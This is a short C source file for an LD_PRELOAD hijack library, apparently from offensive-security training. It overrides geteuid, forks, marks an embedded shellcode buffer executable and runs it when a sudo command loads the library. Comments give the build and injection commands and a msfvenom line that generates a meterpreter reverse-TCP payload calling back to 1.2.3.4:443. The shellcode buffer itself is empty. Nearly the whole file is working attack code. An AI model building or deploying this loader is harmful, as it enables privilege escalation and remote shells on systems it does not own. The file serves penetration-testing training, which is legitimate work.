#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// gcc -Wall -fPIC -z execstack -c -o library.o library.c
// gcc -shared -o library.so library.o -ldl
// export LD_PRELOAD=/home/offsec/library.so
// sudo cp /etc/passwd /tmp/testpasswd

// TODO: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f c
unsigned char buf[] = "";

uid_t geteuid(void)
{
    typeof(geteuid) *old_geteuid;
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");

    if (fork() == 0)
    {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
            perror("mprotect");
            return -1;
        }
        int (*ret)() = (int(*)())buf;
        ret();
    }
    else
    {
        printf("HACK: returning from function...\n");
        return (*old_geteuid)();
    }
    printf("Hack: Returning from main...\n");
    return -2;

}
